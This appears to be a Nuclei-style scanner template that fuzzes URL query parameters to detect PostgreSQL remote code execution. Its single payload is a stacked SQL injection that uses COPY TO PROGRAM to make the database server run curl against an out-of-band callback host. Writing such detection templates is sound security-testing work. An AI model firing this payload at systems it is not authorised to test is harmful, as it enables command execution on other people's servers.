id: fuzz-copy-to-program-oob

info:
  name: PostgreSQL COPY TO PROGRAM OOB
  author: openai
  severity: critical
  tags: postgres,rce,oob,dast

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      copyprog:
        - "1; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}'--"

    fuzzing:
      - part: query
        mode: single
        fuzz:
          - "{{copyprog}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - http
